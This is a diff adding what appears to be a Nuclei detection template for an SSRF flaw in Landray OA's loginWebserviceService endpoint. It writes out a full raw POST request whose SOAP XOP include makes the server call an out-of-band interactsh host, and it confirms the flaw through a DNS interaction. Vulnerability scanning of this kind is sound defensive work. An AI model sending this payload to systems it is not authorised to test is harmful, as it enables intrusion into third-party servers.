@@ -1,0 +1,33 @@
+id: landray-loginwebserviceservice-ssrf
+info:
+  name: Landray OA loginWebserviceService SSRF Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: ssrf,dnslog
+http:
+  - raw:
+      - |
+        POST /sys/webservice/loginWebserviceService HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/related; boundary=----4upt9dwdca8rtwq9osuz
+
+        ------4upt9dwdca8rtwq9osuz
+        Content-Disposition: form-data; name="a"
+
+        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://sso.authentication.sys.kmss.landray.com/">
+        <soapenv:Header/>
+        <soapenv:Body>
+            <web:getLoginSessionId>
+                <arg0>
+                    <beginTimeStamp>a</beginTimeStamp>
+                    <count><xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="http://{{interactsh-url}}"/></count>
+                </arg0>
+            </web:getLoginSessionId>
+        </soapenv:Body>
+        </soapenv:Envelope>
+        ------4upt9dwdca8rtwq9osuz--
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
